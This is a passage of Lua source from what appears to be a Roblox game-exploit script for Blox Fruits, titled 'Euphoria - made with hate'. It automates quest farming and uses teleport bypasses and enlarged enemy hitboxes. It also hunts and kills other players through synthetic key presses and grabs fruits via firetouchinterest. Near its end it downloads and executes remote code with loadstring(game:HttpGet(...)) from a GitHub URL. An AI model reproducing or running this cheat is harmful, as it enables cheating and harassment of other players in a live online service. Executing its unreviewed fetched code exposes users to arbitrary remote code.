                                        task.wait(.2)
                                        if getDistance(Quest.QuestGiverPosition) > 4000 then
                                            repeat wait()
                                                toTarget(Quest.QuestGiverPosition)
                                            until getDistance(Quest.QuestGiverPosition) < 10
                                        end
                                    end
                                end
                                if game:GetService("Workspace").Enemies:FindFirstChild(Quest.NPCName) then
                                    questStarted = true
                                    for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                                        if v.Name == Quest.NPCName then
                                            if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
                                                repeat task.wait()
                                                    if not string.find(LP.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text, Quest.QuestNPCName) then
                                                        ReplicatedStorage.Remotes.CommF_:InvokeServer("AbandonQuest")
                                                    else
                                                        status, err = pcall(function()
                                                            PosMon = v.HumanoidRootPart.CFrame
                                                            v.HumanoidRootPart.Size = Vector3.new(90,90,90)
                                                            v.HumanoidRootPart.CanCollide = false
                                                            v.Humanoid.WalkSpeed = 0
                                                            v.Head.CanCollide = false
                                                            BringMobFarm = true
                                                            EquipWeapon(_G.SelectWeapon)
                                                            v.HumanoidRootPart.Transparency = 1
                                                            useNearestEntrance(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                                            toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                                        end)
                                                        if err then print(err) end
                                                    end
                                                until not v.Parent or v.Humanoid.Health <= 0 or QuestC.Visible == false or not v:FindFirstChild("HumanoidRootPart")
                                            end
                                        end
                                    end
                                else
                                    useNearestEntrance(Quest.NPCPosition * OffsetCFrame())
                                    toTarget(Quest.NPCPosition * OffsetCFrame())
                                    if (Quest.NPCPosition.Position - LP.Character.HumanoidRootPart.Position).Magnitude <= 50 then
                                        wait(0.5)
                                    end
                                end
                            else
                                if LP.PlayerGui.Main.Quest.Visible == false then
                                    questStarted = false
                                    if (Quest.QuestGiverPosition.Position - LP.Character.HumanoidRootPart.Position).Magnitude >= 3000 then
                                        useNearestEntrance(Quest.QuestGiverPosition)
                                        wait(.2)
                                        if getDistance(Quest.QuestGiverPosition) > 2000 then
                                            Bypass(Quest.QuestGiverPosition)
                                            wait(.2)
                                            if getDistance(Quest.QuestGiverPosition) > 2000 then
                                                repeat wait()
                                                    tf = toTarget(Quest.QuestGiverPosition)
                                                until getDistance(Quest.QuestGiverPosition) < 10
                                            end
                                        end
                                    else
                                        repeat wait() toTarget(Quest.QuestGiverPosition) until (Quest.QuestGiverPosition.Position - LP.Character.HumanoidRootPart.Position).Magnitude <= 60
                                    end
                                    if (Quest.QuestGiverPosition.Position - LP.Character.HumanoidRootPart.Position).Magnitude <= 40 then
                                        BringMobFarm = true
                                        wait(0.2)
                                        game:GetService('ReplicatedStorage').Remotes.CommF_:InvokeServer("StartQuest", Quest.QuestName, Quest.QuestLevel) wait(0.5)
                                        toTarget(Quest.NPCPosition * OffsetCFrame())
                                    end
                                end
                            end
                        end
                    end 
                end)
                if err then print(err) end
            end
        end)

        function GetAvailableSkills()
            skills = {}
            if LP.Character:FindFirstChildOfClass("Tool") then
                tool = LP.Character:FindFirstChildOfClass("Tool")
                level = tool.Level.Value
                skill = "Z"
                if LP.PlayerGui.Main.Skills[tool.Name]:FindFirstChild(skill) then
                    needLevel = nil
                    if string.len(LP.PlayerGui.Main.Skills[tool.Name]:FindFirstChild(skill).Level.Text) == 8 then
                        needLevel = tonumber(string.sub(LP.PlayerGui.Main.Skills[tool.Name]:FindFirstChild(skill).Level.Text, -3))
                    end
                    if string.len(LP.PlayerGui.Main.Skills[tool.Name]:FindFirstChild(skill).Level.Text) == 7 then
                        needLevel = tonumber(string.sub(LP.PlayerGui.Main.Skills[tool.Name]:FindFirstChild(skill).Level.Text, -2))
                    end
                    if string.len(LP.PlayerGui.Main.Skills[tool.Name]:FindFirstChild(skill).Level.Text) == 6 then
                        needLevel = tonumber(string.sub(LP.PlayerGui.Main.Skills[tool.Name]:FindFirstChild(skill).Level.Text, -1))
                    end
                    if needLevel then
                        if level >= needLevel then
                            if LP.PlayerGui.Main.Skills[tool.Name]:FindFirstChild(skill).Cooldown.Size == UDim2.new(0, 0, 1, -1) then
                                table.insert(skills, skill)
                            end
                        end
                    end
                end
                skill = "X"
                if LP.PlayerGui.Main.Skills[tool.Name]:FindFirstChild(skill) then
                    needLevel = nil
                    if string.len(LP.PlayerGui.Main.Skills[tool.Name]:FindFirstChild(skill).Level.Text) == 8 then
                        needLevel = tonumber(string.sub(LP.PlayerGui.Main.Skills[tool.Name]:FindFirstChild(skill).Level.Text, -3))
                    end
                    if string.len(LP.PlayerGui.Main.Skills[tool.Name]:FindFirstChild(skill).Level.Text) == 7 then
                        needLevel = tonumber(string.sub(LP.PlayerGui.Main.Skills[tool.Name]:FindFirstChild(skill).Level.Text, -2))
                    end
                    if string.len(LP.PlayerGui.Main.Skills[tool.Name]:FindFirstChild(skill).Level.Text) == 6 then
                        needLevel = tonumber(string.sub(LP.PlayerGui.Main.Skills[tool.Name]:FindFirstChild(skill).Level.Text, -1))
                    end
                    if needLevel then
                        if level >= needLevel then
                            if LP.PlayerGui.Main.Skills[tool.Name]:FindFirstChild(skill).Cooldown.Size == UDim2.new(0, 0, 1, -1) then
                                table.insert(skills, skill)
                            end
                        end
                    end
                end
                skill = "C"
                if LP.PlayerGui.Main.Skills[tool.Name]:FindFirstChild(skill) then
                    needLevel = nil
                    if string.len(LP.PlayerGui.Main.Skills[tool.Name]:FindFirstChild(skill).Level.Text) == 8 then
                        needLevel = tonumber(string.sub(LP.PlayerGui.Main.Skills[tool.Name]:FindFirstChild(skill).Level.Text, -3))
                    end
                    if string.len(LP.PlayerGui.Main.Skills[tool.Name]:FindFirstChild(skill).Level.Text) == 7 then
                        needLevel = tonumber(string.sub(LP.PlayerGui.Main.Skills[tool.Name]:FindFirstChild(skill).Level.Text, -2))
                    end
                    if string.len(LP.PlayerGui.Main.Skills[tool.Name]:FindFirstChild(skill).Level.Text) == 6 then
                        needLevel = tonumber(string.sub(LP.PlayerGui.Main.Skills[tool.Name]:FindFirstChild(skill).Level.Text, -1))
                    end
                    if needLevel then
                        if level >= needLevel then
                            if LP.PlayerGui.Main.Skills[tool.Name]:FindFirstChild(skill).Cooldown.Size == UDim2.new(0, 0, 1, -1) then
                                table.insert(skills, skill)
                            end
                        end
                    end
                end
                skill = "V"
                if LP.PlayerGui.Main.Skills[tool.Name]:FindFirstChild(skill) then
                    needLevel = nil
                    if string.len(LP.PlayerGui.Main.Skills[tool.Name]:FindFirstChild(skill).Level.Text) == 8 then
                        needLevel = tonumber(string.sub(LP.PlayerGui.Main.Skills[tool.Name]:FindFirstChild(skill).Level.Text, -3))
                    end
                    if string.len(LP.PlayerGui.Main.Skills[tool.Name]:FindFirstChild(skill).Level.Text) == 7 then
                        needLevel = tonumber(string.sub(LP.PlayerGui.Main.Skills[tool.Name]:FindFirstChild(skill).Level.Text, -2))
                    end
                    if string.len(LP.PlayerGui.Main.Skills[tool.Name]:FindFirstChild(skill).Level.Text) == 6 then
                        needLevel = tonumber(string.sub(LP.PlayerGui.Main.Skills[tool.Name]:FindFirstChild(skill).Level.Text, -1))
                    end
                    if needLevel then
                        if level >= needLevel then
                            if LP.PlayerGui.Main.Skills[tool.Name]:FindFirstChild(skill).Cooldown.Size == UDim2.new(0, 0, 1, -1) then
                                table.insert(skills, skill)
                            end
                        end
                    end
                end
                skill = "F"
                if LP.PlayerGui.Main.Skills[tool.Name]:FindFirstChild(skill) then
                    needLevel = nil
                    if string.len(LP.PlayerGui.Main.Skills[tool.Name]:FindFirstChild(skill).Level.Text) == 8 then
                        needLevel = tonumber(string.sub(LP.PlayerGui.Main.Skills[tool.Name]:FindFirstChild(skill).Level.Text, -3))
                    end
                    if string.len(LP.PlayerGui.Main.Skills[tool.Name]:FindFirstChild(skill).Level.Text) == 7 then
                        needLevel = tonumber(string.sub(LP.PlayerGui.Main.Skills[tool.Name]:FindFirstChild(skill).Level.Text, -2))
                    end
                    if string.len(LP.PlayerGui.Main.Skills[tool.Name]:FindFirstChild(skill).Level.Text) == 6 then
                        needLevel = tonumber(string.sub(LP.PlayerGui.Main.Skills[tool.Name]:FindFirstChild(skill).Level.Text, -1))
                    end
                    if needLevel then
                        if level >= needLevel then
                            if LP.PlayerGui.Main.Skills[tool.Name]:FindFirstChild(skill).Cooldown.Size == UDim2.new(0, 0, 1, -1) then
                                table.insert(skills, skill)
                            end
                        end
                    end
                end
                return skills
            else
                return {}
            end
        end

        function isAbleToKill(enemy)
            if enemy.Data.Level.Value < 20 then
                return false
            end
            if enemy.Data.Level.Value > LP.Data.Level.Value + 500 then
                return false
            end
            if enemy.Data.DevilFruit.Value == 'Buddha-Buddha' or enemy.Data.DevilFruit.Value == 'Dough-Dough' or enemy.Data.DevilFruit.Value == 'Kitsune-Kitsune' then
                return false
            end
            if (enemy.Data.Stats.Defense.Level.Value - (LP.Data.Stats.Melee.Level.Value * 4)) - 300 > LP.Data.Stats.Melee.Level.Value * 10 + 400 then
                return false
            end
            
            return true
        end
        skipcount = 0
        -- KAITUN
        -- ============================
        task.spawn(function()
            while task.wait() do
                st, err = pcall(function()
                    local MyLevel = LP.Data.Level.Value
                    local QuestC = LP.PlayerGui.Main.Quest
                    local Quest = QuestCheck()

                    if skipcount > 40 then
                        HopServer()
                    end
                    
                    if _G.Kaitun then
                        if first_sea then
                            if QuestC.Visible == true then
                                if isPlayerHunterQuest(LP.PlayerGui.Main.Quest) then
                                    target = nil
                                    for i, plr in pairs(Players:GetChildren()) do
                                        if target then break end
                                        if string.find(LP.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text, plr.Name) then
                                            target = plr
                                        end
                                    end
                                    if not target then 
                                        skipcount = skipcount + 1
                                        ReplicatedStorage.Remotes.CommF_:InvokeServer("AbandonQuest") 
                                    end
                                    if not isAbleToKill(target) then
                                        skipcount = skipcount + 1
                                        ReplicatedStorage.Remotes.CommF_:InvokeServer("AbandonQuest") 
                                    end
                                    done = false
                                    repeat task.wait()
                                        if not target.Character:FindFirstChild("HumanoidRootPart") then done = true end
                                        if getDistance(target.Character.HumanoidRootPart.CFrame) > 4000 then
                                            useNearestEntrance(target.Character.HumanoidRootPart.CFrame)
                                            task.wait(.2)
                                            if getDistance(target.Character.HumanoidRootPart.CFrame) > 10000 then
                                                Bypass(target.Character.HumanoidRootPart.CFrame)
                                            end
                                            if getDistance(target.Character.HumanoidRootPart.CFrame) > 4000 then
                                                repeat task.wait()
                                                    toTarget(target.Character.HumanoidRootPart.CFrame)
                                                until getDistance(target.Character.HumanoidRootPart.CFrame) < 100 or getDistance(target.Character.HumanoidRootPart.CFrame) > 1500 or not LP.PlayerGui.Main.Quest.Visible
                                                StopTween()
                                            end
                                        end
                                        _G.KillingPlayer = true
                                        if LP.PlayerGui.Main.PvpDisabled.Visible == true then
                                            repeat task.wait() until LP.Character.Humanoid.Health > 0
                                            ReplicatedStorage.Remotes.CommF_:InvokeServer("EnablePvp")
                                            toTarget(LP.Character.HumanoidRootPart.CFrame)
                                        end
                                        char = target.Character
                                        _G.AimbotPos = char.HumanoidRootPart.Position
                                        
                                        if char then
                                            if char:FindFirstChild("HumanoidRootPart") then
                                                if getDistance(char.HumanoidRootPart.CFrame) <= 50 then
                                                    skills = GetAvailableSkills()
                                                    for i,v in ipairs(skills) do
                                                        game:service('VirtualInputManager'):SendKeyEvent(true, v, false, game)
                                                        game:service('VirtualInputManager'):SendKeyEvent(false, v, false, game)
                                                    end
                                                end
                                                PosMon = char.HumanoidRootPart.CFrame
                                                BringMobFarm = false
                                                EquipWeapon(_G.SelectWeapon)
                                                char.HumanoidRootPart.Transparency = 1
                                                toTarget(char.HumanoidRootPart.CFrame * CFrame.new(1, 3, 0))
                                            end
                                        end
                                    until not char or not char:FindFirstChild("Parent") or not char:FindFirstChild("Humanoid") or char.Humanoid.Health <= 0 or LP.PlayerGui.Main.Quest.Visible == false or not char:FindFirstChild("HumanoidRootPart") or done == true
                                    _G.KillingPlayer = false
                                    _G.AimbotPos = nil
                                else
                                    if not string.find(LP.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text, Quest.QuestNPCName) then
                                        ReplicatedStorage.Remotes.CommF_:InvokeServer("AbandonQuest")
                                    end
                                    if not questStarted then
                                        useNearestEntrance(Quest.QuestGiverPosition)
                                        task.wait(.2)
                                        if getDistance(Quest.QuestGiverPosition) > 10000 then
                                            Bypass(Quest.QuestGiverPosition)
                                            task.wait(.2)
                                            if getDistance(Quest.QuestGiverPosition) > 4000 then
                                                repeat wait()
                                                    toTarget(Quest.QuestGiverPosition)
                                                until getDistance(Quest.QuestGiverPosition) < 10
                                            end
                                        end
                                    end

                                    if game:GetService("Workspace").Enemies:FindFirstChild(Quest.NPCName) then
                                        questStarted = true
                                        for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                                            if v.Name == Quest.NPCName then
                                                if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
                                                    repeat task.wait()
                                                        if not string.find(LP.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text, Quest.QuestNPCName) then
                                                            ReplicatedStorage.Remotes.CommF_:InvokeServer("AbandonQuest")
                                                        else
                                                            status, err = pcall(function()
                                                                PosMon = v.HumanoidRootPart.CFrame
                                                                v.HumanoidRootPart.Size = Vector3.new(90,90,90)
                                                                v.HumanoidRootPart.CanCollide = false
                                                                v.Humanoid.WalkSpeed = 0
                                                                v.Head.CanCollide = false
                                                                BringMobFarm = true
                                                                EquipWeapon(_G.SelectWeapon)
                                                                v.HumanoidRootPart.Transparency = 1
                                                                toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                                            end)
                                                            if err then print(err) end
                                                        end
                                                    until not v.Parent or v.Humanoid.Health <= 0 or QuestC.Visible == false or not v:FindFirstChild("HumanoidRootPart")
                                                end
                                            end
                                        end
                                    else
                                        useNearestEntrance(Quest.NPCPosition * OffsetCFrame())
                                        toTarget(Quest.NPCPosition * OffsetCFrame())
                                        if (Quest.NPCPosition.Position - LP.Character.HumanoidRootPart.Position).Magnitude <= 50 then
                                            wait(0.5)
                                        end
                                    end
                                end
                            else
                                if MyLevel < 10 then
                                    game:GetService('ReplicatedStorage').Remotes.CommF_:InvokeServer("StartQuest", Quest.QuestName, Quest.QuestLevel)
                                    toTarget(Quest.NPCPosition * OffsetCFrame())
                                end

                                if MyLevel >= 10 then
                                    if MyLevel < 300 then
                                        if MyLevel > 20 then
                                            if string.find(ReplicatedStorage.Remotes.CommF_:InvokeServer("PlayerHunter"), "We heard") then
                                                ReplicatedStorage.Remotes.CommF_:InvokeServer("EnablePvp")
                                            else
                                                farmSkyGuards()
                                            end
                                        else
                                            farmSkyGuards()
                                        end
                                    end
                                end

                                if MyLevel < 700 and MyLevel >= 300 then
                                    if MyLevel < 690 then
                                        ReplicatedStorage.Remotes.CommF_:InvokeServer("EnablePvp")
                                        ReplicatedStorage.Remotes.CommF_:InvokeServer("PlayerHunter")
                                        wait(.5)
                                    end
                                    if LP.PlayerGui.Main.Quest.Visible == false then
                                        if (Quest.QuestGiverPosition.Position - LP.Character.HumanoidRootPart.Position).Magnitude >= 3000 then
                                            questStarted = false
                                            useNearestEntrance(Quest.QuestGiverPosition)
                                            task.wait(.2)
                                            if getDistance(Quest.QuestGiverPosition) > 10000 then
                                                Bypass(Quest.QuestGiverPosition)
                                                task.wait(.2)
                                                if getDistance(Quest.QuestGiverPosition) > 4000 then
                                                    repeat wait()
                                                        toTarget(Quest.QuestGiverPosition)
                                                    until getDistance(Quest.QuestGiverPosition) < 10
                                                end
                                            end
                                        else
                                            repeat wait() toTarget(Quest.QuestGiverPosition) until (Quest.QuestGiverPosition.Position - LP.Character.HumanoidRootPart.Position).Magnitude <= 60
                                        end
                                        repeat wait() toTarget(Quest.QuestGiverPosition) until (Quest.QuestGiverPosition.Position - LP.Character.HumanoidRootPart.Position).Magnitude <= 60
                                        if (Quest.QuestGiverPosition.Position - LP.Character.HumanoidRootPart.Position).Magnitude <= 40 then
                                            BringMobFarm = true
                                            wait(0.2)
                                            game:GetService('ReplicatedStorage').Remotes.CommF_:InvokeServer("StartQuest", Quest.QuestName, Quest.QuestLevel) wait(0.5)
                                            toTarget(Quest.NPCPosition * OffsetCFrame())
                                        end
                                    end
                                end 
                            end
                        elseif second_sea or third_sea then
                            if QuestC.Visible == true then
                                if not questStarted then
                                    useNearestEntrance(Quest.QuestGiverPosition)
                                    task.wait(.2)
                                    if getDistance(Quest.QuestGiverPosition) > 10000 then
                                        Bypass(Quest.QuestGiverPosition)
                                        task.wait(.2)
                                        if getDistance(Quest.QuestGiverPosition) > 4000 then
                                            repeat wait()
                                                toTarget(Quest.QuestGiverPosition)
                                            until getDistance(Quest.QuestGiverPosition) < 10 or not _G.Kaitun
                                        end
                                    end
                                end
                                if game:GetService("Workspace").Enemies:FindFirstChild(Quest.NPCName) then
                                    questStarted = true
                                    for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                                        if v.Name == Quest.NPCName then
                                            if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
                                                repeat task.wait()
                                                    if not string.find(LP.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text, Quest.QuestNPCName) then
                                                        ReplicatedStorage.Remotes.CommF_:InvokeServer("AbandonQuest")
                                                    else
                                                        status, err = pcall(function()
                                                            PosMon = v.HumanoidRootPart.CFrame
                                                            v.HumanoidRootPart.Size = Vector3.new(90,90,90)
                                                            v.HumanoidRootPart.CanCollide = false
                                                            v.Humanoid.WalkSpeed = 0
                                                            v.Head.CanCollide = false
                                                            BringMobFarm = true
                                                            EquipWeapon(_G.SelectWeapon)
                                                            v.HumanoidRootPart.Transparency = 1
                                                            useNearestEntrance(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                                            toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                                        end)
                                                        if err then print(err) end
                                                    end
                                                until not v.Parent or v.Humanoid.Health <= 0 or QuestC.Visible == false or not v:FindFirstChild("HumanoidRootPart")
                                            end
                                        end
                                    end
                                else
                                    useNearestEntrance(Quest.NPCPosition * OffsetCFrame())
                                    toTarget(Quest.NPCPosition * OffsetCFrame())
                                    if (Quest.NPCPosition.Position - LP.Character.HumanoidRootPart.Position).Magnitude <= 50 then
                                        wait(0.5)
                                    end
                                end
                            else
                                if LP.PlayerGui.Main.Quest.Visible == false then
                                    questStarted = false
                                    if (Quest.QuestGiverPosition.Position - LP.Character.HumanoidRootPart.Position).Magnitude >= 3000 then
                                        useNearestEntrance(Quest.QuestGiverPosition)
                                        wait(.2)
                                        if getDistance(Quest.QuestGiverPosition) > 2000 then
                                            Bypass(Quest.QuestGiverPosition)
                                            wait(.2)
                                            if getDistance(Quest.QuestGiverPosition) > 2000 then
                                                repeat wait()
                                                    tf = toTarget(Quest.QuestGiverPosition)
                                                until getDistance(Quest.QuestGiverPosition) < 10
                                            end
                                        end
                                    else
                                        repeat wait() toTarget(Quest.QuestGiverPosition) until (Quest.QuestGiverPosition.Position - LP.Character.HumanoidRootPart.Position).Magnitude <= 60
                                    end
                                    if (Quest.QuestGiverPosition.Position - LP.Character.HumanoidRootPart.Position).Magnitude <= 40 then
                                        BringMobFarm = true
                                        wait(0.2)
                                        game:GetService('ReplicatedStorage').Remotes.CommF_:InvokeServer("StartQuest", Quest.QuestName, Quest.QuestLevel) wait(0.5)
                                        toTarget(Quest.NPCPosition * OffsetCFrame())
                                    end
                                end
                            end
                        end
                    end 
                end)
                if err then print(err) end
            end
        end)

        local function learnNeededStat()
            local plr = LP
            local Melee = plr.Data.Stats.Melee.Level.Value
            local Defense = plr.Data.Stats.Defense.Level.Value
            local Sword = plr.Data.Stats.Sword.Level.Value
            
            if plr.Data.Points.Value == 0 then return end

            if Melee < 2550 then
                local args = {
                    [1] = "AddPoint",
                    [2] = "Melee",
                    [3] = 2550 - Melee
                }
                ReplicatedStorage.Remotes.CommF_:InvokeServer(unpack(args))
            elseif Defense < 2550 then
                local args = {
                    [1] = "AddPoint",
                    [2] = "Defense",
                    [3] = 2550 - Defense
                }
                ReplicatedStorage.Remotes.CommF_:InvokeServer(unpack(args))
            elseif Sword < 2550 then
                local args = {
                    [1] = "AddPoint",
                    [2] = "Sword",
                    [3] = 2550 - Sword
                }
                ReplicatedStorage.Remotes.CommF_:InvokeServer(unpack(args))
            end
        end

        spawn(function()
            while wait() do
                if _G.Kaitun then
                    learnNeededStat()
                end
            end
        end)

        spawn(function()
            while wait() do
                st, err = pcall(function()
                    if _G.Kaitun and isWeaponInInventory("Combat") and LP.Data.Beli.Value >= 150000 then
                        game.ReplicatedStorage.Remotes.CommF_:InvokeServer("BuyBlackLeg")
                    end
                    wait(40)
                end)
            end
        end)

        spawn(function()
            while wait() do
                if first_sea then
                    if game.ReplicatedStorage.Remotes.CommF_:InvokeServer("DressrosaQuestProgress", "Dressrosa") == 0 then return end
                    if _G.Kaitun or _G.DoSecondSea then
                        if LP.Data.Level.Value >= 700 and game.ReplicatedStorage.Remotes.CommF_:InvokeServer("DressrosaQuestProgress", "Dressrosa") ~= 0 then
                            doSecondSea()
                        end
                    end
                end
            end
        end)

        local function redeemcodes()
            local redeem = function(code)
                local args = {
                    [1] = code
                }
                ReplicatedStorage.Remotes.Redeem:InvokeServer(unpack(args))
            end
            redeem("SECRET_ADMIN")
            redeem("KITT_RESET")
            redeem("Sub2CaptainMaui")
            redeem("SUB2GAMERROBOT_RESET1")
            redeem("kittgaming")
            redeem("Sub2Fer999")
            redeem("Enyu_is_Pro")
            redeem("Magicbus")
            redeem("JCWK")
            redeem("Starcodeheo")
            redeem("Bluxxy")
            redeem("fudd10_v2")
            redeem("FUDD10")
            redeem("BIGNEWS")
            redeem("THEGREATACE")
            redeem("SUB2GAMERROBOT_EXP1")
            redeem("Sub2OfficialNoobie")
            redeem("StrawHatMaine")
            redeem("SUB2NOOBMASTER123")
            redeem("Sub2UncleKizaru")
            redeem("Sub2Daigrock")
            redeem("Axiore")
            redeem("TantaiGaming")               
            redeem("NEWTROLL")               
            redeem("REWARDFUN")               
        end

        spawn(function()
            while wait() do
                if _G.Kaitun then
                    if LP.Data.Level.Value >= 10 then
                        redeemcodes()
                        return
                    end
                end
            end
        end)

        function countNearestEnemies()
            count = 0
            for i,v in pairs(Enemies:GetChildren()) do
                if getDistance(v.HumanoidRootPart.CFrame) < 200 then
                    count = count + 1
                end
            end
            return count
        end

        coroutine.wrap(function()
            while task.wait() do
                pcall(function()
                    local ac = CombatFrameworkR.activeController
                    if ac and ac.equipped then
                        if _G.FastAttack then
                            status, err = pcall(function() AttackFunction() end)
                            if err then print(err) end
                            if _G.KillingPlayer then
                                if tick() - cooldownfastattack > 1.5 then 
                                    wait(_G.FastAttackDelay + 0.5 or .9) cooldownfastattack = tick() 
                                end
                            else
                                if tick() - cooldownfastattack > 1.5 then 
                                    increment = countNearestEnemies() * .09
                                    if isWeaponInInventory("Dark Step") then
                                        if _G.FastAttackDelay then
                                            cd = _G.FastAttackDelay + .5 + increment
                                        else
                                            cd = .8 + increment 
                                        end
                                        wait(cd) cooldownfastattack = tick() 
                                    else
                                        if _G.FastAttackDelay then
                                            cd = _G.FastAttackDelay + increment
                                        else
                                            cd = .15 + increment
                                        end
                                        wait(cd) cooldownfastattack = tick() 
                                    end
                                end
                            end
                        elseif _G.FastAttack == false then
                            if ac.hitboxMagnitude ~= 55 then
                                ac.hitboxMagnitude = 55
                            end
                            ac:attack()
                        end
                    end
                end)
            end
        end)()
        

        spawn(function()
            while wait() do
                if not LP.Character:FindFirstChild("HasBuso") then
                    ReplicatedStorage.Remotes.CommF_:InvokeServer("Buso")
                end
            end 
        end)
        
        spawn(function()
            while wait() do
                wait(20)
                if _G.AntiAFK then
                    local VirtualUser=game:service'VirtualUser'
                    VirtualUser:CaptureController()
                    VirtualUser:ClickButton2(Vector2.new())
                end
            end
        end)
        
        spawn(function()
            while wait() do
                if _G.LearnMelee then
                    local args = {
                        [1] = "AddPoint",
                        [2] = "Melee",
                        [3] = _G.LearnRate
                    }
                    ReplicatedStorage.Remotes.CommF_:InvokeServer(unpack(args))
                end
                if _G.LearnDefense then
                    local args = {
                        [1] = "AddPoint",
                        [2] = "Defense",
                        [3] = _G.LearnRate
                    }
                    ReplicatedStorage.Remotes.CommF_:InvokeServer(unpack(args))
                end
                if _G.LearnSword then
                    local args = {
                        [1] = "AddPoint",
                        [2] = "Sword",
                        [3] = _G.LearnRate
                    }
                    ReplicatedStorage.Remotes.CommF_:InvokeServer(unpack(args))
                end
                if _G.LearnGun then
                    local args = {
                        [1] = "AddPoint",
                        [2] = "Gun",
                        [3] = _G.LearnRate
                    }
                    ReplicatedStorage.Remotes.CommF_:InvokeServer(unpack(args))
                end
                if _G.LearnFruit then
                    local args = {
                        [1] = "AddPoint",
                        [2] = "Demon Fruit",
                        [3] = _G.LearnRate
                    }
                    ReplicatedStorage.Remotes.CommF_:InvokeServer(unpack(args))
                end
                
            end
        end)
    
        local function getFruitWorth(fruitName)
            worth = {
                ["Quake Fruit"] = 1000000,
                ["Buddha Fruit"] = 1200000,
                ["Love Fruit"] = 1300000,
                ["Spider Fruit"] = 1500000,
                ["Sound Fruit"] = 1700000,
                ["Phoenix Fruit"] = 1800000,
                ["Portal Fruit"] = 1900000,
                ["Rumble Fruit"] = 2100000,
                ["Pain Fruit"] = 2300000,
                ["Blizzard Fruit"] = 2400000,
                ["Gravity Fruit"] = 2500000,
                ["Mammoth Fruit"] = 2700000,
                ["T-Rex Fruit"] = 2700000,
                ["Dough Fruit"] = 2800000,
                ["Shadow Fruit"] = 2900000,
                ["Venom Fruit"] = 3000000,
                ["Control Fruit"] = 3200000,
                ["Spirit Fruit"] = 3400000,
                ["Dragon Fruit"] = 3500000,
                ["Leopard Fruit"] = 5000000,
                ["Kitsune Fruit"] = 8000000,
            }
            return worth[fruitName] or 0
        end
        
        local function isFruitsOnServer() 
            for i,v in pairs(game.Workspace:GetChildren()) do
                if v.Name ~= 'Blox Fruit Dealer' then
                    if string.find(v.Name, ' Fruit') then
                        return true
                    end
                end
            end
            return false
        end
        
        local function takeFruits()
            for i,v in pairs(game.Workspace:GetChildren()) do
                if v.Name ~= 'Blox Fruit Dealer' then
                    if string.find(v.Name, ' Fruit') then
                        repeat wait()
                            LP.Character.HumanoidRootPart.CFrame = v.Fruit.Fruit.CFrame
                            firetouchinterest(LP.Character.HumanoidRootPart, v.Handle.TouchInterest.Parent, 1) 
                            firetouchinterest(LP.Character.HumanoidRootPart, v.Handle.TouchInterest.Parent, 0) 
                            game:service('VirtualInputManager'):SendKeyEvent(true, "W", false, game)
                            game:service('VirtualInputManager'):SendKeyEvent(false, "W", false, game)
                            game:service('VirtualInputManager'):SendKeyEvent(true, "A", false, game)
                            game:service('VirtualInputManager'):SendKeyEvent(false, "A", false, game)
                        until not v or not v.Parent or v.Parent.Name ~= 'Workspace'
                    end
                end
            end
        end
        
        local function storeFruit(fruitName, fruitRealName) 
            repeat wait()
                if LP.Character:FindFirstChild(fruitName) then
                    local args = {
                        [1] = "StoreFruit",
                        [2] = fruitRealName,
                        [3] = LP.Character:FindFirstChild(fruitName)
                    }
                    ReplicatedStorage.Remotes.CommF_:InvokeServer(unpack(args))
                elseif LP.Backpack:FindFirstChild(fruitName) then
                    local args = {
                        [1] = "StoreFruit",
                        [2] = fruitRealName,
                        [3] = LP.Backpack:FindFirstChild(fruitName)
                    }
                    ReplicatedStorage.Remotes.CommF_:InvokeServer(unpack(args))
                else return end
            until not isWeaponInInventory(fruitName)
        end
        
        function isFruitInBackpack(OriginalName)
            for i,v in pairs(ReplicatedStorage.Remotes["CommF_"]:InvokeServer("getInventoryFruits")) do
                if OriginalName == v.Name then return true end
            end
            return false
        end

        local function storeAllFruits()
            for i,v in pairs(LP.Backpack:GetChildren()) do 
                if string.find(v.Name, ' Fruit') and not isFruitInBackpack(v:GetAttribute("OriginalName")) then
                    print("Storing", v.Name)
                    pcall(function() storeFruit(v.Name, v:GetAttribute("OriginalName")) end)
                    wait(.5)
                end
            end
            for i,v in pairs(LP.Character:GetChildren()) do 
                if string.find(v.Name, ' Fruit') and not isFruitInBackpack(v:GetAttribute("OriginalName")) then
                    print("Storing", v.Name)
                    LP.Character.Humanoid:EquipTool(v)
                    pcall(function() storeFruit(v.Name, v:GetAttribute("OriginalName")) end)
                    wait(.5)
                end
            end
        end
        
        local function isWorthFruitInInventory()
            for i,v in pairs(LP.Backpack:GetChildren()) do 
                if string.find(v.Name, ' Fruit') then
                    if getFruitWorth(v.Name) >= 1000000 then return true end
                end
            end
            for i,v in pairs(LP.Character:GetChildren()) do 
                if string.find(v.Name, ' Fruit') then
                    if getFruitWorth(v.Name) >= 1000000 then return true end
                end
            end
            return false
        end
        
        
        local function isFruitsInInventory()
            for i,v in pairs(LP.Backpack:GetChildren()) do 
                if string.find(v.Name, ' Fruit') then
                    return true
                end
            end
            for i,v in pairs(LP.Character:GetChildren()) do 
                if string.find(v.Name, ' Fruit') then
                    return true
                end
            end
            return false
        end
        
        function UnEquip()
            for i,v in pairs(LP.Character:GetChildren()) do
                if v:FindFirstChild("Tool") or string.find(v.Name, '-') or v:FindFirstChild("firing") then 
                    LP.Character:FindFirstChild(v.Name).Parent = LP.Backpack
                end
            end
        end

        local libUrl = "https://raw.githubusercontent.com/deadcxde/Euphoria/main/lib/ui.lua"
        local Library = loadstring(game:HttpGet(libUrl))()
        local Window = Library.CreateLib("Euphoria - made with hate", "DarkTheme")
        
        spawn(function()
            while wait() do
                pcall(function()
